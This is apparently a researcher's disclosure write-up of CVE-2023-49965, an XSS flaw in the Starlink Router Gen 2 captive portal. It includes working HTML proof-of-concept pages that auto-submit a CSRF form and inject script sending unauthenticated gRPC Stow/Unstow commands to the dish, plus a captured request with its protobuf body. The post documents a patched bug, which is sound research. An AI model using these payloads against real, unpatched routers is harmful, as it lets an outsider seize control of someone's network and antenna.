# SpaceX / Starlink Router Gen 2 XSS (CVE-2023-49965)

You can see the Korean version of the post here : <br>
<a href="https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor/">```https://hackintoanetwork.com/blog/2023-starlink-router-gen2-xss-kor```</a>

# TL;DR

---

A `Cross-Site Scripting (XSS)` vulnerability in the initial `captive portal` page of the second-generation router could allow an attacker to take control of the `router` and `Dishy`.

# **The Basics**

---

- **Product :** Starlink Router Gen 2
- **Tested Version :** 2022.32.0 (The fix is in versions 2023.48.0 and up)
- **Bug-class** : XSS(Cross-Site Scripting)

# ****Overview of the Vulnerability****

---

![img1.webp](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/img1.webp)

The vulnerability is caused by insufficient filtering of input values for the `ssid` and `password` parameters on the initial router setup page ([http://192.168.1.1/setup](http://192.168.1.1/setup)).

```html
<html>
	<body>
		<h1>Proof of Concept</h1>
		<form id="PoC" method="POST" action="http://192.168.1.1/setup">
			<input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'>
			<!-- <input type="hidden" name="password" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```

This `Cross-Site Scripting (XSS)` vulnerability can be leveraged in conjunction with a `Cross-Site Request Forgery (CSRF)` attack, as shown in the proof of concept above.

[reproduce(PoC).mov](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/reproduce(PoC).mov)

# **Exploit**

---

Normally, the `captive portal` page should only be active on the `router's internal address`, 192.168.1.1, but there was a bug in older routers that allowed the captive portal page to be unexpectedly accessible from `Dishy's internal address`, 192.168.100.1.

- [http://192.168.1.1/setup](http://192.168.1.1/setup) → The captive portal page is displayed correctly.
    
    ![http://192.168.1.1/setup](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/img2.png)
    
- [http://192.168.100.1/setup](http://192.168.100.1/setup) → The captive portal page is also displayed at this address.
    
    ![http://192.168.100.1/setup](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/img3.png)
    

(Normally, access to the captive portal page should not be possible at Dishy's internal address, 192.168.100.1.)

Using such a bug along with the `Cross-Site Scripting (XSS)` vulnerability allows for the circumvention of the browser's `Same-Origin Policy (SOP)`, enabling control over both the Router and Dishy.

[192.168.100.1_PoC.mov](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/192.168.100.1_PoC.mov)

It can be confirmed that the same `Cross-Site Scripting (XSS)` vulnerability occurs at the address [http://192.168.100.1/setup](http://192.168.100.1/setup) as well.

Now let's see how i can leverage these bugs to take control of `Router` and `Dishy`.

## Dishy Stow Request Analysis

---
<center>

![Starlink Dishy Stow](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/gif1.gif)
</center>

When the `Stow` command is issued from the administrator interface, the following HTTP Request is sent to `Dishy`


(Note: The `Stow` command allows the `Dishy` antenna to be folded for movement or storage.)

```
POST /SpaceX.API.Device.Device/Handle HTTP/1.1
Host: 192.168.100.1:9201
Content-Length: 8
x-grpc-web: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36
content-type: application/grpc-web+proto
Accept: */*
Origin: http://dishy.starlink.com
Referer: http://dishy.starlink.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

�}
```

This Request's header contains several important pieces of information.

- **x-grpc-web: 1**
    
    This indicates the use of the **`gRPC-Web`** protocol.
    
    (**`gRPC-Web`** is a protocol that allows web clients to make gRPC calls to a server.)
    
- **content-type: application/grpc-web+proto**
    
    It signifies that the data being transmitted uses the gRPC protocol and is encoded in the protobuf format.
    
- **Request Body**
    
    ![Dishy Stow Request body (Hex)](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/img4.png)
    
    Dishy Stow Request body (Hex)
    
    ```html
    \x00\x00\x00\x00\x03\xef\xbf\xbd\x7d\x00
    ```
    
    The request body contains data in the **`grpc-web+proto`** format, which likely holds the details of the **`Stow`** command.
    

Putting this information together, when a user issues a `Stow` command using the admin interface, the command is sent to `Dishy` over `gRPC`, which folds `Dishy` into a portable state.

However, if you look at the request, you'll notice that there is no authentication for the user sending it.

This means that someone other than an administrator could send the same request and take control of `Dishy` without authorization. But this vulnerability requires the attacker to have `physical access` to the `local network`, which limits the scope of the attack compared to attacks that can occur remotely.

## **Possibility and Limitations of CSRF Attacks**

---

If so, you might be thinking that you can attempt a `Cross-Site Request Forgery (CSRF)` attack with a payload that sends the same request.

While this is a possible scenario, the browser's `Same-Origin Policy (SOP)` limits this attack.

`gRPC` requires a specific `content-type` header called `application/grpc-web+proto`.

However, the `Same-Origin Policy (SOP)` causes browsers to strip this header when sending requests from other sources.

This makes it impossible to send `gRPC` requests to `Dishy` from the outside under normal circumstances.

## XSS: An Effective Way to Bypass SOP

---

Normally, a `Same-Origin Policy (SOP)` restricts web browsers from making requests from different sources.

However, with a `Cross-Site Scripting (XSS)` vulnerability, an attacker can execute a script within the victim's web browser.

Scripts injected by an attacker using a `Cross-Site Scripting (XSS)` vulnerability are considered to have been executed from the same source (i.e., the website the victim is currently on).

Because of this, the `Same-Origin Policy (SOP)` recognizes requests generated by these scripts as coming from the same source, and therefore the restrictions of the `Same-Origin Policy (SOP)` do not apply in this case.

Therefore, in a `Cross-Site Request Forgery (CSRF)` attack using a `Cross-Site Scripting (XSS)` vulnerability that requires a specific `content-type` header, such as a `gRPC` request, because the attack script is running inside the victim's browser, the request is recognized as a legitimate request and sent with this specific `content-type` header.

For example, by chaining a bug in `192.168.100.1` and `Cross-Site Scripting (XSS)` vulnerability, an attacker could send a malicious script to proxy a user's browser to send a `grpc` request to command the `Router` or `Dishy`. (The attacker could send a variety of `grpc` requests, including Dishy's `Stow` and `Unstow` commands).

## Exploit PoC (Proof of Concept)

---

Therefore, by chaining the `Cross-Site Scripting (XSS)` vulnerability and the aforementioned `bug`, a payload that sends a `Stow gRPC` request to `Dishy` can be constructed as follows: (The result is that an attacker can remotely take control of the `router` or `Dishy`. For example, they could send `grpc` commands to change `router settings` or manipulate `Dishy's functionality`.)

```html
<html>
	<body>
		<h1>Dishy Stow and Unstow</h1>
		<form id="PoC" method="POST" action="http://192.168.100.1/setup">
			<!-- <input type="hidden" name="ssid" value='" onfocus=javascript:alert(`XSS`); autofocus="'> -->
			<input type="hidden" name="password" value='"><script>for(let i=0;i<100;i++){setTimeout(()=>{var xhr=new XMLHttpRequest();xhr.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr.setRequestHeader("x-grpc-web","1");xhr.setRequestHeader("Content-Type","application/grpc-web+proto");xhr.onreadystatechange=()=>{if(xhr.readyState==4&&xhr.status==200){console.log(xhr.responseText);}};xhr.send(new Uint8Array([0,0,0,0,3,146,125,0]).buffer);setTimeout(()=>{var xhr2=new XMLHttpRequest();xhr2.open("POST","http://192.168.100.1:9201/SpaceX.API.Device.Device/Handle",true);xhr2.setRequestHeader("x-grpc-web","1");xhr2.setRequestHeader("Content-Type","application/grpc-web+proto");xhr2.onreadystatechange=()=>{if(xhr2.readyState==4&&xhr2.status==200){console.log(xhr2.responseText);}};xhr2.send(new Uint8Array([0,0,0,0,5,146,125,2,8,1]).buffer);},1000);},i*2000);}</script><input type="hidden'/>
		</form>
		<script type="text/javascript">
			document.addEventListener("DOMContentLoaded", function() {
				document.getElementById("PoC").submit();
			});
		</script>
	</body>
<html>
```

# Demo

---

[Exploit-PoC.mp4](https://hackintoanetwork.com/blog/2023-Starlink-Router-Gen2-XSS/Exploit-PoC.mp4)

# CVE

- [CVE-2023-49965](https://www.cve.org/CVERecord?id=CVE-2023-49965)

# **TimeLine**

- 2023-10-10 : Vulnerability reported to SpaceX/Starlink
- 2023-10-12 : Recognized as a security vulnerability with a severity of Moderate ( Reward `$500` USD )
- 2023-11-01 : Patched in the latest release (The fix is in versions `2023.48.0` and up)
